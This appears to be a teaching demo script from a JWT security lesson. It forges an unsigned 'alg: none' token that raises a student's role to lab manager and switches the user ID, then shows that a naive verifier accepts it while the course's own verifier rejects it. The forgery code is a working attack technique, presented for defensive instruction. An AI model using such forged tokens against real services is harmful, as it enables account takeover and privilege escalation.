// demo4/alg-none.mjs — lesson 4.2, attack 1: the "none" algorithm. The token says "I am not signed — trust me".
import { b64urlJson, decodeJwt } from '../src/jwt/index.js';
import { JwtError } from '../src/jwt/verify.js';
import { verifyNaive } from './_naive.mjs';
import { makeIssuer } from './_util.mjs';

const { tokens, keyring, kp, kid } = makeIssuer();
const pem = kp.publicKey.export({ type: 'spki', format: 'pem' });

// Start from An's real token, read its claims (free), raise the role, and strip the signature.
const real = tokens.issue('usr_1', { role: 'STUDENT' });
const claims = { ...decodeJwt(real).payload, sub: 'usr_3', role: 'LAB_MANAGER' };
const header = b64urlJson({ alg: 'none', typ: 'JWT', kid });
const forged = `${header}.${b64urlJson(claims)}.`;   // note the trailing dot: an EMPTY signature

console.log('forged token header :', JSON.stringify(decodeJwt(forged).header));
console.log('forged token claims : sub =', claims.sub, 'role =', claims.role, '(no signature at all)\n');

console.log('a verifier that trusts the header (demo4/_naive.mjs):');
try { const p = verifyNaive(forged, pem); console.log('  ACCEPTED → the attacker is', p.sub, 'as', p.role, '— account takeover'); }
catch (e) { console.log('  rejected:', e.message); }

console.log('\nLabFlow ID\'s verifier (src/jwt/verify.js) — the algorithm comes from the KEY, not the token:');
try { tokens.verify(forged); console.log('  ACCEPTED (broken)'); }
catch (e) { console.log('  rejected →', e instanceof JwtError ? e.code : e.message, '(kid ' + kid + ' is an EdDSA key; "none" is not EdDSA)'); }
